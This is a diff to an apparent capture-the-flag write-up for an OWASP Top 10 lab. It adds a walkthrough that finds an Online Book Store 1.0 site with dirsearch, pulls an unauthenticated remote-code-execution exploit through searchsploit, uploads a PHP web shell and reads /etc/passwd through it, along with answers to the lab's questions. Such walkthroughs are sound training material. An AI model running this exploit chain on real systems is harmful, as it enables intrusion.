@@ -318,21 +318,59 @@ $ cat /home/cmnatic/flag.txt
 # [Severity 9] Components With Known Vulnerabilities - Lab
 
 ### How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer)
+Use dirsearch.
 ```
+┌──(root💀kali)-[~]
+└─# dirsearch -u http://<machine ip>/
+...
+[17:49:31] 200 -  116B  - /README.md
+...
 ```
-> *Answer:* 
+Google Search <a href="https://github.com/projectworldsofficial/online-book-store-project-in-php" target="_blank">online-book-store-project-in-php</a>.<br>
+Use searchsploit.
+```
+┌──(root💀kali)-[~]
+└─# searchsploit online book store                                                                                                                                                                              1 ⨯
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                    |  Path
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+GotoCode Online Bookstore - Multiple Vulnerabilities                                                                                                                              | asp/webapps/17921.txt
+Online Book Store 1.0 - 'bookisbn' SQL Injection                                                                                                                                  | php/webapps/47922.txt
+Online Book Store 1.0 - 'id' SQL Injection                                                                                                                                        | php/webapps/48775.txt
+Online Book Store 1.0 - Arbitrary File Upload                                                                                                                                     | php/webapps/47928.txt
+Online Book Store 1.0 - Unauthenticated Remote Code Execution                                                                                                                     | php/webapps/47887.py
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+┌──(root💀kali)-[~]
+└─# searchsploit -m 47887                                                                                                                                                                                       2 ⨯
+  Exploit: Online Book Store 1.0 - Unauthenticated Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/47887
+     Path: /usr/share/exploitdb/exploits/php/webapps/47887.py
+File Type: ASCII text
+
+Copied to: /root/47887.py
+
+
+┌──(root💀kali)-[~]
+└─# python3 47887.py http://<machine ip>/                                                                                                                                                                      1 ⨯
+> Attempting to upload PHP web shell...
+> Verifying shell upload...
+> Web shell uploaded to http://10.10.144.143/bootstrap/img/ICf1PQsfYy.php
+> Example command usage: http://10.10.144.143/bootstrap/img/ICf1PQsfYy.php?cmd=whoami
+> Do you wish to launch a shell here? (y/n): y
+RCE $ wc -c /etc/passwd
+1611 /etc/passwd
+```
+> *Answer:* 1611
 
 
 <br><br>
 # [Severity 10] Insufficient Logging and Monitoring
 
 ### What IP address is the attacker using?
-```
-```
-> *Answer:* 
+> *Answer:* 49.99.13.16
 
 ### What kind of attack is being carried out?
-```
-```
-> *Answer:* 
+> *Answer:* brute force
 
